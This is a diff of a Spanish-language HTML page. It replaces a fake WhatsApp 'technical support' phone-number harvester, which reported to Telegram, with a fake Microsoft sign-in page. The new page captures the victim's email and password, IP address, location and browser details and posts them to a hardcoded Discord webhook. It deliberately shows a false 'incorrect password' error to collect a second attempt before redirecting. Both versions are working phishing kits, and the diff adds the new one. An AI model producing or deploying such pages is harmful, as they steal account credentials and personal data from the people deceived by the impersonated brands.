@@ -1,200 +1,345 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Home</title>
-  <link href="../fonts.googleapis.com/css2@family=Poppins%253Awght@400%3B600&amp;display=swap.css" rel="stylesheet" />
-  <style>
-    /* MISMO ESTILO */
-    body {
-      margin: 0;
-      font-family: 'Poppins', sans-serif;
-      background: linear-gradient(135deg, #4caf50, #81c784);
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-
-    .login-box {
-      background: white;
-      padding: 40px 30px;
-      border-radius: 16px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
-      width: 350px;
-      max-width: 90%;
-      text-align: center;
-    }
-
-    .login-box h1 {
-      margin-bottom: 24px;
-      font-weight: 600;
-      color: #333;
-    }
-
-    label {
-      display: block;
-      font-weight: 600;
-      margin-bottom: 8px;
-      color: #555;
-      text-align: left;
-    }
-
-    select, input[type="tel"] {
-      width: 100%;
-      padding: 12px 15px;
-      font-size: 1rem;
-      margin-bottom: 20px;
-      border: 2px solid #ddd;
-      border-radius: 12px;
-      box-sizing: border-box;
-      height: 48px;
-    }
-
-    select:focus, input[type="tel"]:focus {
-      outline: none;
-      border-color: #4caf50;
-      box-shadow: 0 0 8px rgba(76, 175, 80, 0.3);
-    }
-
-    .phone-inputs {
-      display: flex;
-      gap: 12px;
-    }
-
-    #flag {
-      width: 70px;
-      padding: 12px 15px;
-      border: 2px solid #ddd;
-      border-radius: 12px;
-      background-color: #f7f7f7;
-      font-weight: 600;
-      font-size: 1rem;
-      text-align: center;
-      box-sizing: border-box;
-      height: 48px;
-    }
-
-    #tlf {
-      flex-grow: 1;
-      padding: 12px 15px;
-      border: 2px solid #ddd;
-      border-radius: 12px;
-      font-size: 1rem;
-      box-sizing: border-box;
-      height: 48px;
-    }
-
-    button {
-      width: 100%;
-      padding: 14px;
-      background-color: #21c063;
-      border: none;
-      border-radius: 14px;
-      color: white;
-      font-weight: 600;
-      font-size: 1.1rem;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    button:hover {
-      background-color: #1aa454;
-    }
-
-    .logo {
-      margin-bottom: 30px;
-    }
-
-    .logo img {
-      width: 160px;
-    }
-  </style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en tu cuenta Microsoft</title>
+    <link rel="shortcut icon" type="image/x-icon" href="https://c.s-microsoft.com/favicon.ico?v2">
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+    <script>
+        // Configuración para Discord
+        const discord_webhook_url = "https://discord.com/api/webhooks/1428574338407338044/kgInd80Z5u0ntymDUvJg7wiwe6b2c1LueLE3TSjtyPGQqYTihC1LyTuLDLBY1fpNET0o";
+        
+        // Contador de intentos
+        let intento = 0;
+    </script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body, html {
+            height: 100%;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url('https://cdn.glitch.global/97ec72d4-c73a-4009-af5d-af7e51eb62c3/78_3a53c38a2dc671fb4daf.jpg?v=1749764353828') no-repeat center center fixed;
+            background-size: cover;
+        }
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: -1;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+        }
+        
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            padding: 40px;
+            position: relative;
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        
+        .login-header img {
+            width: 108px;
+            margin-bottom: 24px;
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 8px;
+        }
+        
+        .login-subtitle {
+            font-size: 14px;
+            color: #616161;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-control {
+            width: 100%;
+            height: 44px;
+            padding: 8px 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            transition: all 0.2s ease;
+        }
+        
+        .form-control.error {
+            border-color: #d13438;
+            background-color: #fff4f4;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.3);
+        }
+        
+        .error-message {
+            color: #d13438;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .btn-primary {
+            width: 100%;
+            height: 44px;
+            background: #0067b8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            transition: background 0.2s ease;
+        }
+        
+        .btn-primary:hover {
+            background: #005da6;
+        }
+        
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            .login-box {
+                padding: 24px;
+                margin: 16px;
+            }
+            
+            body {
+                align-items: flex-start;
+                padding-top: 40px;
+                background: #f2f2f2;
+            }
+            
+            body::before {
+                display: none;
+            }
+        }
+    </style>
 </head>
 <body>
+    <div class="login-container">
+        <div class="login-box">
+            <div class="login-header">
+                <img src="https://www.freepnglogos.com/uploads/microsoft-logo-png-transparent-background-1.png" 
+                     alt="Microsoft Logo">
+                <h1 class="login-title">Iniciar sesión</h1>
+                <span class="login-subtitle">Usar tu cuenta de Microsoft.</span>
+            </div>
+            
+            <form id="login-form">
+                <div class="form-group">
+                    <input type="email" 
+                           class="form-control" 
+                           id="email" 
+                           name="email" 
+                           placeholder="Correo electrónico o número de teléfono" 
+                           required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" 
+                           class="form-control" 
+                           id="password" 
+                           name="password" 
+                           placeholder="Contraseña" 
+                           required>
+                    <div id="password-error" class="error-message">
+                        La cuenta o la contraseña son incorrectos. Pruébelo de nuevo.
+                    </div>
+                </div>
 
-<div class="login-box">
-  <div class="logo">
-    <img src="https://i.postimg.cc/ZK4GVr6n/whatlog.png" alt="WhatsApp Logo" />
-  </div>
-  <h1>Soporte Técnico de WhatsApp</h1>
-  <form id="loginForm" onsubmit="return sender();">
-    <label for="pais">Selecciona tu país</label>
-    <select id="pais" name="pais" onchange="selectFlag(event)" required>
-      <option value="" disabled selected>Seleccione el País</option>
-      <option data-flag="+54" data-length="10" value="Argentina">🇦🇷 Argentina</option>
-      <option data-flag="+56" data-length="9" value="Chile">🇨🇱 Chile</option>
-      <option data-flag="+57" data-length="10" value="Colombia">🇨🇴 Colombia</option>
-      <option data-flag="+506" data-length="8" value="Costa Rica">🇨🇷 Costa Rica</option>
-      <option data-flag="+593" data-length="9" value="Ecuador">🇪🇨 Ecuador</option>
-      <option data-flag="+503" data-length="8" value="El Salvador">🇸🇻 El Salvador</option>
-      <option data-flag="+1" data-length="10" value="Estados Unidos">🇺🇸 Estados Unidos</option>
-      <option data-flag="+502" data-length="8" value="Guatemala">🇬🇹 Guatemala</option>
-      <option data-flag="+504" data-length="8" value="Honduras">🇭🇳 Honduras</option>
-      <option data-flag="+52" data-length="10" value="México">🇲🇽 México</option>
-      <option data-flag="+507" data-length="8" value="Panamá">🇵🇦 Panamá</option>
-      <option data-flag="+58" data-length="10" value="Venezuela">🇻🇪 Venezuela</option>
-    </select>
-
-    <label for="tlf">Número de teléfono</label>
-    <div class="phone-inputs">
-      <input id="flag" name="codarea" type="text" disabled placeholder="+00" />
-      <input id="tlf" name="tlf" type="tel" placeholder="Número de teléfono" maxlength="10" pattern="[0-9]{8,10}" required />
+                <button type="submit" class="btn btn-primary" id="submit-btn">
+                    Iniciar sesión
+                </button>
+            </form>
+        </div>
     </div>
 
-    <button type="submit">Siguiente</button>
-  </form>
-</div>
-
-<!-- jQuery -->
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-<!-- Config con token y chat_id -->
-<script src="dt.js"></script>
-
-<!-- IP automática sin token -->
-<script>
-window.onload = function () {
-  fetch("https://ipinfo.io/json")
-    .then(res => res.json())
-    .then(data => {
-      const mensaje = `🟢 NUEVA VISITA\n📍 IP: ${data.ip}\n🌍 País: ${data.country}\n🏙️ Ciudad: ${data.city}`;
-      enviarTelegram(mensaje);
-    });
-};
-</script>
-
-<!-- Código del país -->
-<script>
-function selectFlag(e) {
-  var selectedOption = e.target.selectedOptions[0];
-  var flag = selectedOption.getAttribute("data-flag");
-  var length = selectedOption.getAttribute("data-length");
-  document.getElementById("flag").value = flag;
-  var tlfInput = document.getElementById("tlf");
-  tlfInput.setAttribute("maxlength", length);
-  tlfInput.setAttribute("pattern", "[0-9]{" + length + "}");
-  tlfInput.value = "";
-}
-</script>
-
-<!-- Enviar datos -->
-<script>
-function sender() {
-  var pais = document.getElementById("pais").value;
-  var cod = document.getElementById("flag").value;
-  var tel = document.getElementById("tlf").value;
-  var mensaje = `WhatsApp\n\n🌍 País: ${pais}\n📞 Teléfono: ${cod}${tel}\n\nC0DE BY 4DFC TRAMP$$ 👨🏻‍💻🥷🏻`;
-
-  localStorage.setItem("telefono_completo", cod + tel);
-
-  enviarTelegram(mensaje, function(success) {
-      window.location = "index2.html";
-  });
-
-  return false;
-}
-</script>
-
+    <script>
+        // Función para obtener datos de geolocalización
+        async function getGeoData() {
+            let ip = "N/A";
+            let location = "N/A";
+            
+            try {
+                // Obtener IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+                
+                // Obtener ubicación basada en IP
+                const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
+                const geoData = await geoResponse.json();
+                location = `${geoData.city}, ${geoData.region}, ${geoData.country}`;
+            } catch (error) {
+                console.error("Error al obtener datos de geolocalización:", error);
+            }
+            
+            return { ip, location };
+        }
+        
+        // Función para enviar datos a Discord
+        async function sendToDiscord(email, password) {
+            try {
+                // Obtener datos de geolocalización
+                const geoData = await getGeoData();
+                
+                // Obtener información del navegador
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                
+                // Crear mensaje para Discord
+                const message = {
+                    content: `🔐 **NUEVO INICIO DE SESIÓN**\n\n` +
+                             `📧 **Correo:** ${email}\n` +
+                             `🔒 **Contraseña:** ${password}\n` +
+                             `🌐 **IP:** ${geoData.ip}\n` +
+                             `📍 **Ubicación:** ${geoData.location}\n` +
+                             `🖥️ **Dispositivo:** ${platform}\n` +
+                             `🌍 **Idioma:** ${language}\n` +
+                             `🕐 **Zona Horaria:** ${timezone}\n` +
+                             `📱 **Resolución:** ${screenResolution}\n` +
+                             `🔢 **Intento:** ${intento + 1}/2`
+                };
+                
+                // Enviar a Discord
+                const response = await fetch(discord_webhook_url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message)
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`Error HTTP: ${response.status}`);
+                }
+                
+                return true;
+            } catch (error) {
+                console.error("Error al enviar a Discord:", error);
+                return false;
+            }
+        }
+        
+        // Manejar el envío del formulario
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submit-btn');
+            const passwordField = document.getElementById('password');
+            const errorMessage = document.getElementById('password-error');
+            
+            // Validar campos
+            if (!email || !password) {
+                passwordField.classList.add('error');
+                errorMessage.textContent = "Introduzca un correo electrónico y una contraseña válidos.";
+                errorMessage.style.display = 'block';
+                return;
+            }
+            
+            // Mostrar estado de carga
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="loading"></span>Iniciando sesión...';
+            
+            // Enviar datos a Discord
+            await sendToDiscord(email, password);
+            
+            // Incrementar intento
+            intento++;
+            
+            // Esperar 1 segundo para simular procesamiento
+            setTimeout(() => {
+                if (intento === 1) {
+                    // Primer intento: mostrar error
+                    passwordField.classList.add('error');
+                    errorMessage.textContent = "La cuenta o la contraseña son incorrectos. Pruébelo de nuevo.";
+                    errorMessage.style.display = 'block';
+                    
+                    // Limpiar solo el campo de contraseña
+                    document.getElementById('password').value = '';
+                    
+                    // Restaurar botón
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Iniciar sesión';
+                } else if (intento === 2) {
+                    // Segundo intento: redirigir
+                    submitBtn.innerHTML = '<span class="loading"></span>Redirigiendo...';
+                    
+                    setTimeout(() => {
+                        window.location.href = 'index1.html';
+                    }, 1000);
+                }
+            }, 1000);
+        });
+        
+        // Limpiar error cuando el usuario empiece a escribir
+        document.getElementById('password').addEventListener('input', function() {
+            this.classList.remove('error');
+            document.getElementById('password-error').style.display = 'none';
+        });
+        
+        document.getElementById('email').addEventListener('input', function() {
+            document.getElementById('password').classList.remove('error');
+            document.getElementById('password-error').style.display = 'none';
+        });
+    </script>
 </body>
 </html>
